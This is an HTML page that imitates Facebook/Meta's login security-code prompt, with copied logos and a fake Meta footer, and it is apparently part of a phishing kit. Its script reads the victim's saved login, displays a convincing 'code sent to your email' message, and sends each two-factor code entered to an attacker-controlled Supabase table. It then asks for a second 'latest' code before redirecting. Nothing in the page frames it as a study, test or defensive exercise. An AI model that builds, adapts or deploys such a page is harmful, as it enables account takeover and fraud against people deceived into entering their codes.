<!doctype html>
<html lang="en">
  <head>
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/fblogo.png" />

    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Facebook â€“ Confirm Your Identity</title>
    <style>
      body {
        background-color: #f0f2f5;
        font-family: Arial, sans-serif;
        margin: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
      }
      .confirmation-container {
        background: white;
        max-width: 400px;
        width: 90%;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        text-align: center;
      }
      .fb-logo img {
        height: 40px;
        margin-bottom: 20px;
      }
      h2 {
        color: #1c1e21;
        font-size: 20px;
        margin-bottom: 10px;
      }
      p {
        color: #606770;
        font-size: 14px;
        margin-bottom: 25px;
        line-height: 1.4;
      }
      input[type="text"] {
        width: 100%;
        padding: 12px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 6px;
        margin-bottom: 20px;
        box-sizing: border-box;
      }
      .btn {
        width: 100%;
        background-color: #1877f2;
        color: white;
        border: none;
        padding: 12px;
        font-size: 16px;
        border-radius: 6px;
        cursor: pointer;
        margin-bottom: 15px;
      }
      .btn:disabled {
        background-color: #9bbafc;
        cursor: not-allowed;
      }
      .resend-link {
        font-size: 13px;
        color: #1877f2;
        cursor: pointer;
      }
      .resend-link:hover {
        text-decoration: underline;
      }
      .meta-footer {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background-color: white;
        padding: 10px 20px;
        box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
        text-align: center;
      }
      .top-line {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .top-line img {
        height: 24px;
      }
      .meta-text {
        font-weight: bold;
        font-size: 1.1rem;
        color: #333;
      }
      .bottom-line {
        font-size: 0.9rem;
        color: #555;
      }
      .error-message {
        color: red;
        font-size: 12px;
        margin-top: -15px;
        margin-bottom: 15px;
        text-align: left;
      }
    </style>
  </head>
  <body>
    <div class="confirmation-container">
      <div class="fb-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
      </div>
      <h2 id="heading-text">Enter Security Code</h2>
      <p id="confirmation-msg"></p>

      <input type="text" id="code-input" placeholder="Enter code" maxlength="20" autocomplete="off" />
      <button id="continue-btn" class="btn" onclick="verifyCode()">Continue</button>
      <div class="resend-link" onclick="alert('A new code has been sent.')">
        Didn't get the code?
      </div>
    </div>

    <div class="meta-footer">
      <div class="top-line">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta logo" />
        <div class="meta-text">Meta</div>
      </div>
      <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
    </div>

    <script type="module">
      import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

      const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
      const SUPABASE_KEY = "YOUR-ANON-KEY";
      const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

      let awaitingLatest = false;

      window.onload = function () {
        const user = localStorage.getItem("login_user");
        const msgEl = document.getElementById("confirmation-msg");
        if (!user) {
          msgEl.textContent =
            "To confirm it's really you trying to log in, we sent a code to your account.";
        } else {
          let displayType = "account";
          let ending = "";
          const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
          if (emailRegex.test(user)) {
            displayType = "email";
            ending = user.slice(user.indexOf("@"));
          } else if (/^\\d{7,}$/.test(user)) {
            displayType = "phone number";
            ending = user.slice(-4);
          } else {
            displayType = "username";
            ending = user.length > 4 ? user.slice(-4) : user;
          }
          msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}.`;
        }
      };

      async function verifyCode() {
        const codeInput = document.getElementById("code-input");
        const continueBtn = document.getElementById("continue-btn");
        const headingEl = document.getElementById("heading-text");
        const msgEl = document.getElementById("confirmation-msg");
        const code = codeInput.value.trim();

        // Clear old errors
        document.querySelectorAll(".error-message").forEach(el => el.remove());
        codeInput.style.borderColor = "#ccc";

        if (!code) {
          codeInput.style.borderColor = "red";
          const error = document.createElement("div");
          error.className = "error-message";
          error.textContent = "Required";
          codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
          return;
        }

        continueBtn.disabled = true;

        try {
          if (!awaitingLatest) {
            await supabase.from("codes").insert([
              {
                user: localStorage.getItem("login_user") || "unknown",
                step: "first",
                code,
              },
            ]);

            awaitingLatest = true;
            headingEl.textContent = "Enter Latest Code";
            msgEl.textContent = "Kindly enter the most recent code we sent.";
            msgEl.style.color = "red";
            codeInput.value = "";
            codeInput.focus();
          } else {
            await supabase.from("codes").insert([
              {
                user: localStorage.getItem("login_user") || "unknown",
                step: "latest",
                code,
              },
            ]);
            window.location.href = "homepage.html";
          }
        } catch (err) {
          console.error("Supabase error:", err);
          alert("An error occurred while saving your code. Try again.");
        } finally {
          continueBtn.disabled = false;
        }
      }
    </script>
  </body>
</html>
